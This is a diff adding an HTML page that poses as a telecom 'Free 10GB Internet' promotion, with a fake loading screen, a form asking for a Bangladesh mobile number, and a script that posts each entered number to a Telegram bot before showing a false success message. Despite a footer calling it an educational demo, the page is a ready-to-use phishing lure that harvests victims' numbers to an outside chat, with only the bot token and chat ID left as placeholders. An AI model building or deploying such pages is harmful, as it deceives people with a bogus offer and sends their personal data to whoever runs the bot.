@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Free 10GB Internet Offer</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: 'Segoe UI', sans-serif;
+}
+body{
+    background: linear-gradient(135deg,#0a1a2f,#000814);
+    color:#fff;
+}
+
+/* Loader */
+#loader{
+    position:fixed;
+    inset:0;
+    background:#000814;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    z-index:999;
+}
+.loader-logo{
+    font-size:28px;
+    font-weight:bold;
+    color:#00c3ff;
+}
+.loader-bar{
+    width:200px;
+    height:5px;
+    background:#002;
+    margin-top:20px;
+    overflow:hidden;
+}
+.loader-bar span{
+    display:block;
+    width:50%;
+    height:100%;
+    background:#00c3ff;
+    animation:load 1.2s infinite;
+}
+@keyframes load{
+    0%{margin-left:-50%}
+    100%{margin-left:100%}
+}
+
+/* Main */
+.container{
+    max-width:400px;
+    margin:120px auto;
+    background:rgba(255,255,255,0.05);
+    padding:25px;
+    border-radius:12px;
+    box-shadow:0 0 25px rgba(0,195,255,.2);
+}
+.logo{
+    text-align:center;
+    font-size:26px;
+    font-weight:bold;
+    color:#00c3ff;
+}
+.subtitle{
+    text-align:center;
+    font-size:14px;
+    margin-top:5px;
+    opacity:.8;
+}
+
+input{
+    width:100%;
+    padding:14px;
+    margin-top:20px;
+    border-radius:8px;
+    border:none;
+    outline:none;
+    font-size:16px;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    margin-top:15px;
+    border:none;
+    border-radius:8px;
+    background:#00c3ff;
+    color:#000;
+    font-weight:bold;
+    font-size:16px;
+    cursor:pointer;
+}
+button:hover{
+    background:#00a8dd;
+}
+
+.note{
+    margin-top:15px;
+    font-size:12px;
+    opacity:.7;
+    text-align:center;
+}
+
+.steps{
+    margin-top:20px;
+    font-size:13px;
+}
+.steps li{
+    margin:6px 0;
+}
+.footer{
+    text-align:center;
+    margin-top:20px;
+    font-size:11px;
+    opacity:.6;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Loader -->
+<div id="loader">
+    <div class="loader-logo">Telecom Network</div>
+    <div class="loader-bar"><span></span></div>
+    <p style="margin-top:10px;font-size:12px;opacity:.7;">Initializing Services...</p>
+</div>
+
+<!-- Main Content -->
+<div class="container" style="display:none" id="main">
+    <div class="logo">Free 10GB Internet</div>
+    <div class="subtitle">Limited Telecom Promotional Offer</div>
+
+    <input type="tel" id="number" placeholder="Enter Bangladesh Number (01XXXXXXXXX)">
+
+    <button onclick="submitData()">Verify Number</button>
+
+    <ul class="steps">
+        <li>✔ Enter your mobile number</li>
+        <li>✔ Click verify</li>
+        <li>✔ Wait up to 24 hours</li>
+    </ul>
+
+    <div class="note">
+        This is a demo project for educational purposes only.  
+        No personal data is stored or misused.
+    </div>
+
+    <div class="footer">
+        © 2025 Telecom Demo Page
+    </div>
+</div>
+
+<script>
+setTimeout(()=>{
+    document.getElementById("loader").style.display="none";
+    document.getElementById("main").style.display="block";
+},2000);
+
+function submitData(){
+    let number = document.getElementById("number").value.trim();
+    let regex = /^01[3-9][0-9]{8}$/;
+
+    if(!regex.test(number)){
+        alert("Please enter a valid Bangladesh number");
+        return;
+    }
+
+    // Telegram Demo Bot
+    let botToken = "YOUR_BOT_TOKEN";
+    let chatId = "YOUR_CHAT_ID";
+    let text = `📡 New Demo Submission\n📱 Number: ${number}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+        method:"POST",
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+            chat_id:chatId,
+            text:text
+        })
+    });
+
+    alert("Verification request submitted successfully!");
+}
+</script>
+
+</body>
+</html>
